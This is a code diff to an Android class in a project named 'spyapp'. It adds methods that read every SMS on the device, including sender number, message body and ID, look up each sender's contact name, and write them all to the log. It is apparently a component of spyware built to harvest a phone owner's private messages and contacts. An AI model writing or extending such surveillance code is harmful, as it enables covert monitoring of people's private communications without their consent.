@@ -1,13 +1,68 @@
 package com.example.spyapp;
 
+import android.content.ContentResolver;
 import android.content.Context;
 import android.database.Cursor;
 import android.net.Uri;
+import android.provider.ContactsContract.PhoneLookup;
 import android.util.Log;
 
 public class GetSMS {
 
 	public GetSMS(){}
+	
+	
+	public void getAllSms(Context context) {
+	    Uri message = Uri.parse("content://sms/");
+	    ContentResolver cr = context.getContentResolver();
+	    Cursor c = cr.query(message, null, null, null, null);
+	    int totalSMS = c.getCount();
+	    if (c.moveToFirst()) {
+	        for (int i = 0; i < totalSMS; i++) {
+
+	            Log.d("GetSMS",
+	                    "Contact number : "
+	                            + c.getString(c
+	                                    .getColumnIndexOrThrow("address"))
+	                            + "\n"
+	                            + "msg : "
+	                            + c.getString(c.getColumnIndexOrThrow("body"))
+	                            + "\n"
+	                            + "ID : "
+	                            + c.getString(c.getColumnIndexOrThrow("_id"))
+	                            + "\n"
+	                            + "Person : "
+	                            + getContactName(
+	                            		context.getApplicationContext(),
+	                                    c.getString(c
+	                                            .getColumnIndexOrThrow("address"))));
+
+	            c.moveToNext();
+	        }
+	    }
+	    c.close();
+
+	}
+
+	public String getContactName(Context context, String phoneNumber) {
+	    ContentResolver cr = context.getContentResolver();
+	    Uri uri = Uri.withAppendedPath(PhoneLookup.CONTENT_FILTER_URI,
+	            Uri.encode(phoneNumber));
+	    Cursor cursor = cr.query(uri,
+	            new String[] { PhoneLookup.DISPLAY_NAME }, null, null, null);
+	    if (cursor == null) {
+	        return null;
+	    }
+	    String contactName = null;
+	    if (cursor.moveToFirst()) {
+	        contactName = cursor.getString(cursor
+	                .getColumnIndex(PhoneLookup.DISPLAY_NAME));
+	    }
+	    if (cursor != null && !cursor.isClosed()) {
+	        cursor.close();
+	    }
+	    return contactName;
+	}
 
 	public void getConversations(Context context){
 		Uri SMS_INBOX = Uri.parse("content://sms/conversations/");
